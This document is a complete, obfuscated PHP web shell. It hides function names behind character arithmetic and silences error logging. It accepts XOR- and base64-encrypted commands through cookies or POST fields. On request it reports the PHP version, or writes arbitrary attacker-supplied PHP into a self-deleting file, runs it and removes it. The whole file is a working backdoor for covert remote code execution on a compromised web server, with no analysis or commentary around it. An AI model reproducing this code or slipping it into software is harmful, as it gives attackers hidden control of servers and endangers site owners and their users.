<?php $rxara = "\146"."\x69".'l'.chr(101)."\x5f".'p'.'u'."\x74".chr(769-674).chr(99).'o'."\x6e".'t'.'e'."\156".chr(653-537)."\x73";
$kvvemm = "\142".chr(97)."\x73".chr(1021-920).'6'.chr(963-911).chr(760-665)."\x64"."\x65".'c'.chr(111).chr(100).chr(525-424);
$ivssmilmuh = "\x69".chr(110).'i'."\137"."\163"."\x65".chr(116);
$vnsioxfmbj = chr(646-529).chr(110)."\154".'i'."\156".chr(107);


@$ivssmilmuh("\x65".chr(810-696)."\162"."\x6f".chr(114).chr(330-235).chr(108).chr(111)."\x67", NULL);
@$ivssmilmuh(chr(739-631)."\x6f"."\147".'_'.chr(958-857).'r'.chr(565-451).chr(111)."\x72".chr(514-399), 0);
@$ivssmilmuh("\155".'a'.'x'.chr(764-669).chr(240-139)."\170".chr(101)."\143".'u'."\x74".chr(643-538).'o'."\156".'_'."\164"."\x69".'m'."\x65", 0);
@set_time_limit(0);

function xemlewjk($puoxuwexv, $kutfyhmk)
{
    $hvipl = "";
    for ($lttcbtfkj = 0; $lttcbtfkj < strlen($puoxuwexv);) {
        for ($j = 0; $j < strlen($kutfyhmk) && $lttcbtfkj < strlen($puoxuwexv); $j++, $lttcbtfkj++) {
            $hvipl .= chr(ord($puoxuwexv[$lttcbtfkj]) ^ ord($kutfyhmk[$j]));
        }
    }
    return $hvipl;
}

$armkfnlutl = array_merge($_COOKIE, $_POST);
$axyrmskmbx = '8e243617-684f-4278-a86c-bab2a8782415';
foreach ($armkfnlutl as $tqkjcfp => $puoxuwexv) {
    $puoxuwexv = @unserialize(xemlewjk(xemlewjk($kvvemm($puoxuwexv), $axyrmskmbx), $tqkjcfp));
    if (isset($puoxuwexv[chr(97).chr(107)])) {
        if ($puoxuwexv["\x61"] == "\x69") {
            $lttcbtfkj = array(
                "\x70".chr(852-734) => @phpversion(),
                "\163".'v' => "3.5",
            );
            echo @serialize($lttcbtfkj);
        } elseif ($puoxuwexv["\x61"] == chr(101)) {
            $dalktlzk = "./" . md5($axyrmskmbx) . '.'."\151".chr(475-365).chr(708-609);
            @$rxara($dalktlzk, "<" . "\77"."\160"."\x68"."\160".' '."\100".'u'.chr(509-399).chr(108).chr(552-447)."\156".chr(107).chr(40)."\x5f"."\137".'F'.chr(73).chr(335-259)."\105".chr(281-186).chr(95).chr(41).chr(59)."\x20" . $puoxuwexv[chr(100)]);
            @include($dalktlzk);
            @$vnsioxfmbj($dalktlzk);
        }
        exit();
    }
}

